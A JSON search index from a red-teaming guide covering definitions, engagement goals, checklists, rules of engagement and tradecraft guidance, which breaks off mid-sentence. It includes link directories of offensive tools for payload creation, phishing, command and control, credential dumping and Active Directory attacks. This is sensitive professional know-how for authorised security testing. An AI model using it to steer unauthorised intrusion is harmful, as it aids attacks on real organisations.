to understanding how the threat was able to impact an organization\u2019s operations or how security operations was able to impact a threat\u2019s ability to operate.","title":"Red Teaming in Perspective to Organizational Risk"},{"location":"redteaming/red_vs_pen_vs_vuln/#bottom-line","text":"Vulnerability assessment and Penetration tests are a means to identify technical flaws with the ultimate goal of reducing a targets attack surface. Red teaming is a goal driven scenario used to train or measure blue. Red teaming goals lie in understanding security operations as a whole. people, processes, and technology.","title":"Bottom Line"},{"location":"redteaming/red_vs_pen_vs_vuln/#references","text":"Threat Gets a Vote - Applying a threat-based approach to security testing","title":"References"},{"location":"redteaming/redteaming/","text":"What is Red Teaming? \u00b6 Red teaming is a goal oriented process driven by threat tactics. The focus is on training or measuring a blue team's ability to defend against this threat. Defense covers protection, detection, response, and recovery. PDRR Definition: Red Teaming is the process of using Tactics, Techniques, and Procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of the people, processes, and technology used to defend an environment. Red teaming is NOT a hunt for vulnerabilities, flaws, bugs, etc. The goal is to understand security operations as a whole (people, processes, and technology). The result of a red team engagement may identify vulnerabilities, but more importantly, red teaming provides an understanding of blue's capability to impact a threat's ability to operate. Why Red Team? \u00b6 Measure the effectiveness of the people, processes, and technology used to defend a network. How do you know if blue TTPs are effective? Train and/or measure Blue Teams ability to impact a threat Blue teams need practice. Better to practice on a helpful threat that a real one Test and understand specific threats or threat scenarios Red team engagements can be designed to exercise custom scenarios. Scenarios can include zero-days, ransom-ware attacks, or other unique attacks. Threat Gets a Vote \u00b6 Dig deeper in the need for the threat perspective here. Threat Gets a Vote - Applying a Threat-Based Approach to Security Testing How often do security defenders ask the bad-guy how or what they will do? Many organization develop security defenses without fully understanding what is important to a threat. Red teaming provides defenders an understanding of how a threat operates in a safe controlled process. Better to learn and practice with a Red Team than a real buy guy... anonymous blue teamer Red Teaming vs Penetration Testing vs Vulnerability Testing \u00b6 Follow this link for a comparison of security testing types. http://threatexpress.com/redteaming/red_vs_pen_vs_vuln/","title":"What is Red Teaming"},{"location":"redteaming/redteaming/#what-is-red-teaming","text":"Red teaming is a goal oriented process driven by threat tactics. The focus is on training or measuring a blue team's ability to defend against this threat. Defense covers protection, detection, response, and recovery. PDRR Definition: Red Teaming is the process of using Tactics, Techniques, and Procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of the people, processes, and technology used to defend an environment. Red teaming is NOT a hunt for vulnerabilities, flaws, bugs, etc. The goal is to understand security operations as a whole (people, processes, and technology). The result of a red team engagement may identify vulnerabilities, but more importantly, red teaming provides an understanding of blue's capability to impact a threat's ability to operate.","title":"What is Red Teaming?"},{"location":"redteaming/redteaming/#why-red-team","text":"Measure the effectiveness of the people, processes, and technology used to defend a network. How do you know if blue TTPs are effective? Train and/or measure Blue Teams ability to impact a threat Blue teams need practice. Better to practice on a helpful threat that a real one Test and understand specific threats or threat scenarios Red team engagements can be designed to exercise custom scenarios. Scenarios can include zero-days, ransom-ware attacks, or other unique attacks.","title":"Why Red Team?"},{"location":"redteaming/redteaming/#threat-gets-a-vote","text":"Dig deeper in the need for the threat perspective here. Threat Gets a Vote - Applying a Threat-Based Approach to Security Testing How often do security defenders ask the bad-guy how or what they will do? Many organization develop security defenses without fully understanding what is important to a threat. Red teaming provides defenders an understanding of how a threat operates in a safe controlled process. Better to learn and practice with a Red Team than a real buy guy... anonymous blue teamer","title":"Threat Gets a Vote"},{"location":"redteaming/redteaming/#red-teaming-vs-penetration-testing-vs-vulnerability-testing","text":"Follow this link for a comparison of security testing types. http://threatexpress.com/redteaming/red_vs_pen_vs_vuln/","title":"Red Teaming vs Penetration Testing vs Vulnerability Testing"},{"location":"redteaming/resources/","text":"Red Team References \u00b6 Red Team References \u00b6 External references that contain Red Team related information. Description Link Red Team: How to think like the enemy - Micha Zenko https://www.cfr.org/book/red-team Strategic Cyber Blog http://blog.cobaltstrike.com SpecterOps Blog https://posts.specterops.io ThreatExpress Blog http://threatexpress.com Cobalt Strike Aggressor Scripts @harleyQu1nn https://github.com/harleyQu1nn/AggressorScripts Cobalt Strike Aggressor Scripts @bluescreenofjeff https://github.com/bluscreenofjeff/AggressorScripts Awesome-Red-Teaming https://github.com/yeyintminthuhtut/Awesome-Red-Teaming Red Team Journal http://redteamjournal.com Red Team Infrastructure \u00b6 Tips and tricks on building a Red Team infrastructure. Description Link Red Team Infrastructure Wiki https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki Designing Covert Red Team Infrastructure https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/ Mod_Rewrite Redirectors https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/ CobaltStrike Profiles to Mod_Rewrite http://threatexpress.com/2018/02/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/ SSL Certificate installation/transparency reports https://cryptoreport.websecurity.symantec.com SSL Certificate installation/transparency reports https://transparencyreport.google.com/https/certificates?hl=en Red Team Tools \u00b6 Highlighted Red Team tools based on the Get In, Stay In, and Act concept and the Cyber Kill Chain Get In \u00b6 Reconnaissance \u00b6 Tools for information gathering Description Link BloodHound https://github.com/BloodHoundAD/BloodHound DomainHunter https://github.com/threatexpress/domainhunter EyeWitness https://github.com/ChrisTruncer/EyeWitness MailSniper https://github.com/dafthack/MailSniper Nmap https://nmap.org Recon-NG https://bitbucket.org/LaNMaSteR53/recon-ng Shodan https://www.shodan.io/ OPSEC Considerations for Beacon Commands https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/ Weaponization \u00b6 Tools for creating payloads Description Link CACTUSTORCH https://github.com/mdsecactivebreach/CACTUSTORCH Backdoor Factory https://github.com/secretsquirrel/the-backdoor-factory Unicorn https://github.com/trustedsec/unicorn Veil https://github.com/Veil-Framework 10 Process Injection techniques https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process Delivery \u00b6 Tools for initial access and payload delivery Description Link Social Engineering Toolkit https://github.com/trustedsec/social-engineer-toolkit GoPhish https://getgophish.com/ FiercePhish https://github.com/Raikia/FiercePhish Exploitation \u00b6 Tools for exploitation Description Link Burp Suite https://portswigger.net/burp Exploit-DB https://www.exploit-db.com Metasploit https://www.metasploit.com Zed Attack Proxy https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project Stay In \u00b6 Installation \u00b6 Tools for persistence and payload installation Description Link Windows Privilege Escalation Checklist https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md Persistence https://rastamouse.me/2018/03/a-view-of-persistence/ PowerSploit https://github.com/PowerShellMafia/PowerSploit Command and Control \u00b6 Command and Control tools and frameworks Description Link Empire http://www.powershellempire.com/ CobaltStrike https://cobaltstrike.com/ Kodiac https://github.com/zerosum0x0/koadic PoshC2 https://github.com/nettitude/PoshC2 Pupy https://github.com/n1nj4sec/pupy Merlin https://github.com/Ne0nd0g/merlin Metasploit https://www.metasploit.com/ TinyShell https://github.com/threatexpress/tinyshell Throwback https://github.com/silentbreaksec/Throwback WMImplant https://github.com/ChrisTruncer/WMImplant Act \u00b6 Action on Objectives \u00b6 Tools that perform actions on a target Description Link Misc PowerShell Post Exploitation Scripts https://github.com/rvrsh3ll/Misc-Powershell-Scripts Hashcat https://hashcat.net/hashcat/ GhostPack https://github.com/GhostPack DCOM objects for lateral movement https://www.cybereason.com/blog/dcom-lateral-movement-techniques Mimikatz https://github.com/gentilkiwi/mimikatz PowerUp https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 PowerView https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 WMIOps https://github.com/ChrisTruncer/WMIOps/","title":"General Resources"},{"location":"redteaming/resources/#red-team-references","text":"","title":"Red Team References"},{"location":"redteaming/resources/#red-team-references_1","text":"External references that contain Red Team related information. Description Link Red Team: How to think like the enemy - Micha Zenko https://www.cfr.org/book/red-team Strategic Cyber Blog http://blog.cobaltstrike.com SpecterOps Blog https://posts.specterops.io ThreatExpress Blog http://threatexpress.com Cobalt Strike Aggressor Scripts @harleyQu1nn https://github.com/harleyQu1nn/AggressorScripts Cobalt Strike Aggressor Scripts @bluescreenofjeff https://github.com/bluscreenofjeff/AggressorScripts Awesome-Red-Teaming https://github.com/yeyintminthuhtut/Awesome-Red-Teaming Red Team Journal http://redteamjournal.com","title":"Red Team References"},{"location":"redteaming/resources/#red-team-infrastructure","text":"Tips and tricks on building a Red Team infrastructure. Description Link Red Team Infrastructure Wiki https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki Designing Covert Red Team Infrastructure https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/ Mod_Rewrite Redirectors https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/ CobaltStrike Profiles to Mod_Rewrite http://threatexpress.com/2018/02/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/ SSL Certificate installation/transparency reports https://cryptoreport.websecurity.symantec.com SSL Certificate installation/transparency reports https://transparencyreport.google.com/https/certificates?hl=en","title":"Red Team Infrastructure"},{"location":"redteaming/resources/#red-team-tools","text":"Highlighted Red Team tools based on the Get In, Stay In, and Act concept and the Cyber Kill Chain","title":"Red Team Tools"},{"location":"redteaming/resources/#get-in","text":"","title":"Get In"},{"location":"redteaming/resources/#reconnaissance","text":"Tools for information gathering Description Link BloodHound https://github.com/BloodHoundAD/BloodHound DomainHunter https://github.com/threatexpress/domainhunter EyeWitness https://github.com/ChrisTruncer/EyeWitness MailSniper https://github.com/dafthack/MailSniper Nmap https://nmap.org Recon-NG https://bitbucket.org/LaNMaSteR53/recon-ng Shodan https://www.shodan.io/ OPSEC Considerations for Beacon Commands https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/","title":"Reconnaissance"},{"location":"redteaming/resources/#weaponization","text":"Tools for creating payloads Description Link CACTUSTORCH https://github.com/mdsecactivebreach/CACTUSTORCH Backdoor Factory https://github.com/secretsquirrel/the-backdoor-factory Unicorn https://github.com/trustedsec/unicorn Veil https://github.com/Veil-Framework 10 Process Injection techniques https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process","title":"Weaponization"},{"location":"redteaming/resources/#delivery","text":"Tools for initial access and payload delivery Description Link Social Engineering Toolkit https://github.com/trustedsec/social-engineer-toolkit GoPhish https://getgophish.com/ FiercePhish https://github.com/Raikia/FiercePhish","title":"Delivery"},{"location":"redteaming/resources/#exploitation","text":"Tools for exploitation Description Link Burp Suite https://portswigger.net/burp Exploit-DB https://www.exploit-db.com Metasploit https://www.metasploit.com Zed Attack Proxy https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project","title":"Exploitation"},{"location":"redteaming/resources/#stay-in","text":"","title":"Stay In"},{"location":"redteaming/resources/#installation","text":"Tools for persistence and payload installation Description Link Windows Privilege Escalation Checklist https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md Persistence https://rastamouse.me/2018/03/a-view-of-persistence/ PowerSploit https://github.com/PowerShellMafia/PowerSploit","title":"Installation"},{"location":"redteaming/resources/#command-and-control","text":"Command and Control tools and frameworks Description Link Empire http://www.powershellempire.com/ CobaltStrike https://cobaltstrike.com/ Kodiac https://github.com/zerosum0x0/koadic PoshC2 https://github.com/nettitude/PoshC2 Pupy https://github.com/n1nj4sec/pupy Merlin https://github.com/Ne0nd0g/merlin Metasploit https://www.metasploit.com/ TinyShell https://github.com/threatexpress/tinyshell Throwback https://github.com/silentbreaksec/Throwback WMImplant https://github.com/ChrisTruncer/WMImplant","title":"Command and Control"},{"location":"redteaming/resources/#act","text":"","title":"Act"},{"location":"redteaming/resources/#action-on-objectives","text":"Tools that perform actions on a target Description Link Misc PowerShell Post Exploitation Scripts https://github.com/rvrsh3ll/Misc-Powershell-Scripts Hashcat https://hashcat.net/hashcat/ GhostPack https://github.com/GhostPack DCOM objects for lateral movement https://www.cybereason.com/blog/dcom-lateral-movement-techniques Mimikatz https://github.com/gentilkiwi/mimikatz PowerUp https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 PowerView https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 WMIOps https://github.com/ChrisTruncer/WMIOps/","title":"Action on Objectives"},{"location":"redteaming/rolesandrelationships/","text":"Red Team Roles and Relationships \u00b6 See the Definitions for more information.","title":"Roles and Relationships"},{"location":"redteaming/rolesandrelationships/#red-team-roles-and-relationships","text":"See the Definitions for more information.","title":"Red Team Roles and Relationships"},{"location":"redteaming/windowsactivedirectory/","text":"Attacking Windows and Windows Active Directory \u00b6 .NET \u00b6 Description Link James Forshaw's OleView .NET project https://tyranidslair.blogspot.com/2018/09/finding-interactive-user-com-objects_9.html The DotNetToJScript project to run C# from VBS/JScript https://github.com/tyranid/DotNetToJScript Windows Active Directory \u00b6 Description Link Attack and defend active directory using modern post exploitation adversary tradecraft activity https://github.com/infosecn1nja/AD-Attack-Defense Offensive DPAPI Abuse https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse Internal-Monologue - Retrieving NTLM Hashes without Touching LSASS https://github.com/eladshamir/Internal-Monologue Constrained delegation information https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/ Constrained delegation information http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/ Golden Ticket detections https://adsecurity.org/?p=1515](https://adsecurity.org/?p=1515 ) Golden Ticket detections https://docs.microsoft.com/en-us/azure-advanced-threat-protection/suspicious-activity-guide#kerberos-golden-ticketa-namegolden-ticketa A Guide to Attacking Domain Trusts http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts","title":"Attack Active Directory"},{"location":"redteaming/windowsactivedirectory/#attacking-windows-and-windows-active-directory","text":"","title":"Attacking Windows and Windows Active Directory"},{"location":"redteaming/windowsactivedirectory/#net","text":"Description Link James Forshaw's OleView .NET project https://tyranidslair.blogspot.com/2018/09/finding-interactive-user-com-objects_9.html The DotNetToJScript project to run C# from VBS/JScript https://github.com/tyranid/DotNetToJScript","title":".NET"},{"location":"redteaming/windowsactivedirectory/#windows-active-directory","text":"Description Link Attack and defend active directory using modern post exploitation adversary tradecraft activity https://github.com/infosecn1nja/AD-Attack-Defense Offensive DPAPI Abuse https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse Internal-Monologue - Retrieving NTLM Hashes without Touching LSASS https://github.com/eladshamir/Internal-Monologue Constrained delegation information https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/ Constrained delegation information http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/ Golden Ticket detections https://adsecurity.org/?p=1515](https://adsecurity.org/?p=1515 ) Golden Ticket detections https://docs.microsoft.com/en-us/azure-advanced-threat-protection/suspicious-activity-guide#kerberos-golden-ticketa-namegolden-ticketa A Guide to Attacking Domain Trusts http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts","title":"Windows Active Directory"},{"location":"redteaming/redteamplanning/goalplanning/","text":"Red Team Goals and Planning \u00b6 Description \u00b6 Creating and deciding Red Team engagement goals can be difficult. This is especially true for organizations new to Red Teaming. Whether you are on the delivery or receiving end of a Red Team engagement, the solid goals must be decided to have successful Red Team engagement. This document provides a list of common goals that work well in most Red Team engagements. They can be used as a starting point for planning. Modify and customize as needed. Each goal has a list of questions that can be answered as a narrative from the observations and measurements during a Red Team engagement. Common Goals: Measure and observe ... \u00b6 A threat\u2019s ability to access to common and restricted areas (physical) \u00b6 What ability does a threat have to access common areas? What ability does a threat have to access restricted areas? Can a threat use access gained to enable cyber capabilities? What impacts can a threat have through gained access? A threat\u2019s ability to access key/critical systems \u00b6 Can a threat access key/critical systems? What impacts can a threat have on key/critical systems? A threat\u2019s ability to move freely throughout a network \u00b6 What ability does a threat have to freely move throughout a network? A threat\u2019s ability to gain domain wide and local administrative access? \u00b6 What ability does a threat have to gain local administrative access? What ability does a threat have to gain domain administrative access? What ability does a threat have to gain elevated access? A threat\u2019s ability to access or identify sensitive information \u00b6 What ability does a threat have to access sensitive information? What ability does a threat have to identify sensitive information? A threat\u2019s ability to exfiltrate data outside an organization \u00b6 What ability does a threat have to exfiltrate data outside an organization? How much data must be exfiltrated to impact an organization? A threat\u2019s ability to act undetected for a given time frame \u00b6 How long can a threat go undetected? Can a threat achieve its goals undetected? What must a threat do to stimulate a reaction from an organization? A threat\u2019s ability to perform operational impacts \u00b6 What impacts can a threat perform against an organization? How can a threat affect X?","title":"Goal Planing"},{"location":"redteaming/redteamplanning/goalplanning/#red-team-goals-and-planning","text":"","title":"Red Team Goals and Planning"},{"location":"redteaming/redteamplanning/goalplanning/#description","text":"Creating and deciding Red Team engagement goals can be difficult. This is especially true for organizations new to Red Teaming. Whether you are on the delivery or receiving end of a Red Team engagement, the solid goals must be decided to have successful Red Team engagement. This document provides a list of common goals that work well in most Red Team engagements. They can be used as a starting point for planning. Modify and customize as needed. Each goal has a list of questions that can be answered as a narrative from the observations and measurements during a Red Team engagement.","title":"Description"},{"location":"redteaming/redteamplanning/goalplanning/#common-goals-measure-and-observe","text":"","title":"Common Goals: Measure and observe ..."},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-access-to-common-and-restricted-areas-physical","text":"What ability does a threat have to access common areas? What ability does a threat have to access restricted areas? Can a threat use access gained to enable cyber capabilities? What impacts can a threat have through gained access?","title":"A threat\u2019s ability to access to common and restricted areas (physical)"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-access-keycritical-systems","text":"Can a threat access key/critical systems? What impacts can a threat have on key/critical systems?","title":"A threat\u2019s ability to access key/critical systems"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-move-freely-throughout-a-network","text":"What ability does a threat have to freely move throughout a network?","title":"A threat\u2019s ability to move freely throughout a network"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-gain-domain-wide-and-local-administrative-access","text":"What ability does a threat have to gain local administrative access? What ability does a threat have to gain domain administrative access? What ability does a threat have to gain elevated access?","title":"A threat\u2019s ability to gain domain wide and local administrative access?"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-access-or-identify-sensitive-information","text":"What ability does a threat have to access sensitive information? What ability does a threat have to identify sensitive information?","title":"A threat\u2019s ability to access or identify sensitive information"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-exfiltrate-data-outside-an-organization","text":"What ability does a threat have to exfiltrate data outside an organization? How much data must be exfiltrated to impact an organization?","title":"A threat\u2019s ability to exfiltrate data outside an organization"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-act-undetected-for-a-given-time-frame","text":"How long can a threat go undetected? Can a threat achieve its goals undetected? What must a threat do to stimulate a reaction from an organization?","title":"A threat\u2019s ability to act undetected for a given time frame"},{"location":"redteaming/redteamplanning/goalplanning/#a-threats-ability-to-perform-operational-impacts","text":"What impacts can a threat perform against an organization? How can a threat affect X?","title":"A threat\u2019s ability to perform operational impacts"},{"location":"redteaming/redteamplanning/redteamchecklist/","text":"Red Team Checklist \u00b6 This set of checklists is intended to be a start to help plan and build a red team. Each design may have additional requirements. Use this as a starting point and modify as you see fit. Red Team Development Checklist \u00b6 \u2610 Determine required knowledge and skills \u2610 Identify and implement alternate methods for bridging knowledge gaps \u2610 Develop roles and responsibilities guide \u2610 Develop red team methodology \u2610 Develop TTP guidance for engagements \u2610 Includes Bag of tricks \u2610 Develop data collection guide and tools \u2610 Develop operational process plan \u2610 Develop communication plan template \u2610 Develop ROE template \u2610 Develop technical briefing template \u2610 Develop report template Planning - Red Team Engagement Checklist \u00b6 \u2610 Engagement Planning \u2610 ROE \u2610 Event Communication plan \u2610 Distribute Deconfliction Process \u2610 Entry point/method \u2610 Scope \u2610 Goals/Objectives (should address at least one of the following) \u2610 Protect \u2610 Detect \u2610 Respond \u2610 Restore \u2610 Target Restrictions \u2610 Target Infrastructure / Asset verification / Approvals \u2610 Scenario Development \u2610 Operational Impact planning \u2610 Develop threat profiles \u2610 Network and Host Activity \u2610 IOC Generation (incl subsequent Analysis) and Management \u2610 Plan threat infrastructure \u2610 Tier 1 \u2610 IPs \u2610 Systems \u2610 Redirectors \u2610 PPS \u2610 Tier 2 \u2610 IPs \u2610 Systems \u2610 Redirectors \u2610 PPS \u2610 Tier 3 \u2610 IPs \u2610 Systems \u2610 Redirectors \u2610 PPS \u2610 Deploy tools to infrastructure \u2610 Data collection repository Execution - Red Team Engagement Checklist \u00b6 \u2610 Daily completion and roll-up confirmation \u2610 Capture logs \u2610 Capture screenshots \u2610 Capture system changes \u2610 Daily (or twice daily) mandatory internal RT SITREP \u2610 Update real-time attack diagram Culmination - Red Team Engagement Checklist \u00b6 \u2610 Engagement Closeout \u2610 Roll up data \u2610 Roll back system changes \u2610 Validate data has been collected \u2610 Outline critical attack diagram \u2610 Technical Review (tech-on-tech) \u2610 Executive Brief \u2610 Reporting \u2610 Draft attack narrative \u2610 Draft observation and findings \u2610 Finalize attack diagram \u2610 Finalize report","title":"Red Team Checklist"},{"location":"redteaming/redteamplanning/redteamchecklist/#red-team-checklist","text":"This set of checklists is intended to be a start to help plan and build a red team. Each design may have additional requirements. Use this as a starting point and modify as you see fit.","title":"Red Team Checklist"},{"location":"redteaming/redteamplanning/redteamchecklist/#red-team-development-checklist","text":"\u2610 Determine required knowledge and skills \u2610 Identify and implement alternate methods for bridging knowledge gaps \u2610 Develop roles and responsibilities guide \u2610 Develop red team methodology \u2610 Develop TTP guidance for engagements \u2610 Includes Bag of tricks \u2610 Develop data collection guide and tools \u2610 Develop operational process plan \u2610 Develop communication plan template \u2610 Develop ROE template \u2610 Develop technical briefing template \u2610 Develop report template","title":"Red Team Development Checklist"},{"location":"redteaming/redteamplanning/redteamchecklist/#planning-red-team-engagement-checklist","text":"\u2610 Engagement Planning \u2610 ROE \u2610 Event Communication plan \u2610 Distribute Deconfliction Process \u2610 Entry point/method \u2610 Scope \u2610 Goals/Objectives (should address at least one of the following) \u2610 Protect \u2610 Detect \u2610 Respond \u2610 Restore \u2610 Target Restrictions \u2610 Target Infrastructure / Asset verification / Approvals \u2610 Scenario Development \u2610 Operational Impact planning \u2610 Develop threat profiles \u2610 Network and Host Activity \u2610 IOC Generation (incl subsequent Analysis) and Management \u2610 Plan threat infrastructure \u2610 Tier 1 \u2610 IPs \u2610 Systems \u2610 Redirectors \u2610 PPS \u2610 Tier 2 \u2610 IPs \u2610 Systems \u2610 Redirectors \u2610 PPS \u2610 Tier 3 \u2610 IPs \u2610 Systems \u2610 Redirectors \u2610 PPS \u2610 Deploy tools to infrastructure \u2610 Data collection repository","title":"Planning - Red Team Engagement Checklist"},{"location":"redteaming/redteamplanning/redteamchecklist/#execution-red-team-engagement-checklist","text":"\u2610 Daily completion and roll-up confirmation \u2610 Capture logs \u2610 Capture screenshots \u2610 Capture system changes \u2610 Daily (or twice daily) mandatory internal RT SITREP \u2610 Update real-time attack diagram","title":"Execution - Red Team Engagement Checklist"},{"location":"redteaming/redteamplanning/redteamchecklist/#culmination-red-team-engagement-checklist","text":"\u2610 Engagement Closeout \u2610 Roll up data \u2610 Roll back system changes \u2610 Validate data has been collected \u2610 Outline critical attack diagram \u2610 Technical Review (tech-on-tech) \u2610 Executive Brief \u2610 Reporting \u2610 Draft attack narrative \u2610 Draft observation and findings \u2610 Finalize attack diagram \u2610 Finalize report","title":"Culmination - Red Team Engagement Checklist"},{"location":"redteaming/redteamplanning/roeguide/","text":"ROE \u00b6 Rules of Engagement (ROE) Guidance \u00b6 The Rules of Engagement establish the responsibility, relationship, and guidelines between the Red Team, the network owner, the system owner, and any stakeholders required for engagement execution. This document governs the entire process of a Red Team and must be adhered to during the execution of an engagement. Deviation from the rules established in the ROE must be approved by all parties prior to execution. The ROE document covers numerous topics. Some include: Authorized Actions Explicitly Restricted Actions Authorized Targets and Target Space Restricted Items (Blacklist) Engagement Objectives ROE Document The ROE documents the target information, approvals, threat implementation, activities, and issues required to staff, coordinate, and execute engagements within the target environment. The main body of the ROE (often derived from a standing template) provides information on: The Red Team methodology A high-level description of the types of activities that may be executed The types of hardware and software that may be employed A recommended deconfliction process Levels of threat available (comparison) Roles and responsibilities of each functional group (Exercise Control Group (ECG), White Cell, Training Audience (TA), etc.) The identification of and references to appropriate legal requirements (PCI, FERPA, HIPAA, HITEC, SOX, GLBA, etc.) A legal responsibility disclaimer (federally mandated requirements for the Red Team to report certain findings) Information specific to each individual engagement should be documented in annexes to the ROE. At a minimum, ROE annexes should detail: The Target of the Engagement Organization name Address Specific groups or divisions Organizational identifiers Senior management contact info An Engagement Contact List (name, role, phone, email, office location) ECG personnel White Cell Trusted Agents Red Team Lead Red Tech Lead Engagement Objectives Conditions Threat level Targeted objectives Targets of opportunity Measures of success/failure Authorized Target Space Network The IP boundaries of the event Domains and/or workgroups Specific off-limits areas and resources (non-target intellectual property file share) Off-limits machines, networks, equipment, or applications (blacklist) Maintenance windows Physical Areas of the campus Buildings Offices Off-limits areas (e.g., the emergency services sector of a medical complex) Off-limits materials within the target space (e.g., sensitive documents or equipment) Authorized Actions: Types of activities approved for the engagement Restricted Actions: Types of activities restricted during the engagement (if any) The process for requesting approval of additional activities during engagement execution Approval process Points of contact (name, role, phone, email, office location) Alternate POC The ROE must be updated when the target space, authorized actions, objectives, or scope are changed. For instance, the original scope may be limited to computer network attacks. If physical attacks are planned, the ROE must be updated to reflect the additional activities and controls. The Red Team Lead will address suggestions or adjustments to the ROE. Each review result must be provided to the originator. The final ROE must be approved by a Trusted Agent in senior management of the target environment.","title":"Red Team ROE Guide"},{"location":"redteaming/redteamplanning/roeguide/#roe","text":"","title":"ROE"},{"location":"redteaming/redteamplanning/roeguide/#rules-of-engagement-roe-guidance","text":"The Rules of Engagement establish the responsibility, relationship, and guidelines between the Red Team, the network owner, the system owner, and any stakeholders required for engagement execution. This document governs the entire process of a Red Team and must be adhered to during the execution of an engagement. Deviation from the rules established in the ROE must be approved by all parties prior to execution. The ROE document covers numerous topics. Some include: Authorized Actions Explicitly Restricted Actions Authorized Targets and Target Space Restricted Items (Blacklist) Engagement Objectives ROE Document The ROE documents the target information, approvals, threat implementation, activities, and issues required to staff, coordinate, and execute engagements within the target environment. The main body of the ROE (often derived from a standing template) provides information on: The Red Team methodology A high-level description of the types of activities that may be executed The types of hardware and software that may be employed A recommended deconfliction process Levels of threat available (comparison) Roles and responsibilities of each functional group (Exercise Control Group (ECG), White Cell, Training Audience (TA), etc.) The identification of and references to appropriate legal requirements (PCI, FERPA, HIPAA, HITEC, SOX, GLBA, etc.) A legal responsibility disclaimer (federally mandated requirements for the Red Team to report certain findings) Information specific to each individual engagement should be documented in annexes to the ROE. At a minimum, ROE annexes should detail: The Target of the Engagement Organization name Address Specific groups or divisions Organizational identifiers Senior management contact info An Engagement Contact List (name, role, phone, email, office location) ECG personnel White Cell Trusted Agents Red Team Lead Red Tech Lead Engagement Objectives Conditions Threat level Targeted objectives Targets of opportunity Measures of success/failure Authorized Target Space Network The IP boundaries of the event Domains and/or workgroups Specific off-limits areas and resources (non-target intellectual property file share) Off-limits machines, networks, equipment, or applications (blacklist) Maintenance windows Physical Areas of the campus Buildings Offices Off-limits areas (e.g., the emergency services sector of a medical complex) Off-limits materials within the target space (e.g., sensitive documents or equipment) Authorized Actions: Types of activities approved for the engagement Restricted Actions: Types of activities restricted during the engagement (if any) The process for requesting approval of additional activities during engagement execution Approval process Points of contact (name, role, phone, email, office location) Alternate POC The ROE must be updated when the target space, authorized actions, objectives, or scope are changed. For instance, the original scope may be limited to computer network attacks. If physical attacks are planned, the ROE must be updated to reflect the additional activities and controls. The Red Team Lead will address suggestions or adjustments to the ROE. Each review result must be provided to the originator. The final ROE must be approved by a Trusted Agent in senior management of the target environment.","title":"Rules of Engagement (ROE) Guidance"},{"location":"redteaming/redteamplanning/tradecraft/","text":"Red Team Tradecraft and TTP Guidance \u00b6 This template should be used to define the overall guidance on Red Team Tradecraft and TTPs. Every Red Team should have a guidance document. Keep this document updated and distributed to all Red Team members. This document should be used to guide Red Team actions of all Red Team operators on all engagements. Exceptions to these rules can (and will) be made based on specific Rules of Engagement (ROE) or decision made by Red Team leads during an engagement. Exceptions should be documented as part of the engagement logging. It is important to use and follow this document to maintain a high-quality professional Red Team. Add custom or specific Tradecraft and TTP Guidance to this document as needed. This include specific or customs tools that should be used for various tasks, C2, enumeration, etc Guidance Do Don't Log all significant events Use untested tools on a target system Consult with peers Use unencrypted channels for C2 Understand tools and technology used Attempt to exploit or attack unencrypted websites Perform situational awareness Execute from non-executable locations Minimize callback (C2) volume Download restricted datasets Use binaries for initial access DO: LOG ALL SIGNIFICANT ACTIONS \u00b6 (SUCCESSES AND FAILURES) Log, log and log some more! Screenshot all significant actions including successful and failed attempts. One of the most important aspects of the Red Team engagement is the collection of data (a.k.a. logs). It is common that an inexperienced team completes an engagement with subpar documentation. Many actions are not fully captured, some actions are never captured, and often key failures are ignored. Each action performed provides value to the target as well as the target defenders. Incomplete logs prevent the Red Team from providing a complete and accurate depiction of the actions, obstacles, and defensive strengths and weaknesses of the target (i.e. mission failure). There are several methods to ensure logs are appropriately captured and stored: - Automated logging of the terminal: All terminal actions logged, timestamped and stored to a predefined location. - Tool logs: Most commercial tools have some capability to log actions and produce a raw and/or final report. - Custom tools logs: If you write a custom tool/script, it should output a log of actions and results. - Operator logs: By far this is the most important log. A log may show the action performed and the result; however, only the operator can accurately note the way the action was performed, what lead them to the decision, and their interpretation of the result. - Screenshots: Terminal logs are great for the operator and even better as supporting artifacts; however, they may mean nothing to senior level 